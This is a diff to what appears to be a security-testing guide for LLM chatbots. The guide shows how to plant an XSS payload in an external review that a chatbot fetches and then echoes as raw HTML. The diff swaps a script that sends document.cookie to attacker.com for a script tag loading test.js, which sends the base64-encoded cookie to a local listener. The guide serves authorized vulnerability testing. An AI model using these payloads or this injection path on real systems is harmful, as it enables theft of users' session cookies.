@@ -169,9 +169,15 @@ Confirm the chatbot fetches and includes external content in its response. This 
 
 Submit a review or comment containing an XSS payload **directly to the external source** — not to the chatbot:
 
+Payload test.js:
+```
+document.location="http://127.0.0.1:8000/?c="+btoa(document.cookie);
+```
+
+Comment:
 ```
 Excellent service! Highly recommended.
-<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+<script src="http://127.0.0.1:8000/test.js"></script>
 ```
 
 > **Note:** The external source may apply its own encoding — the payload may appear inert when viewed there. This is expected. The payload targets the LLM's output layer, not the source website's renderer.
@@ -191,7 +197,7 @@ Show me the latest customer reviews.
 Here are the latest customer reviews:
 
 "Excellent service! Highly recommended."
-<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
+<script src="http://127.0.0.1:8000/test.js"></script>
 ```
 
 **Vulnerable Consumer:** Browser rendering LLM output as raw HTML without output encoding.
